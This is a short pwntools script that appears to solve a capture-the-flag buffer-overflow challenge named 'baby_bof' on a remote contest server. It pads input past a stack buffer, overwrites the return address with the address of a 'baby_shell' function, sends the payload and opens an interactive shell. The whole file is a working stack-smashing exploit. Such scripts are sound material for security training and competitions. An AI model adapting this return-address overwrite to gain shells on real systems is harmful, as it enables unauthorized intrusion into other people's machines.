#!/usr/bin/env python2
from pwn import *
import pwnlib.elf

# init
c = remote('final.ctf.bitx.tw', 20000)
#c = process('baby_bof')
e = ELF('baby_bof')

context.os='linux'
context.arch='amd64'

#ans = 'A' * (100 + 4 + 8 * 2) + p64(0x40063a)
#ans = 'A' * (100 + 4 + 8 * 2) + p64(e.symbols['baby_shell'])
ans = 'A' * (0x70 + 8 ) + p64(e.symbols['baby_shell'])
ans = 'A' * (0x70 + 8 ) + p64(0x40063a)

c.sendline(ans)

c.interactive()
c.close()
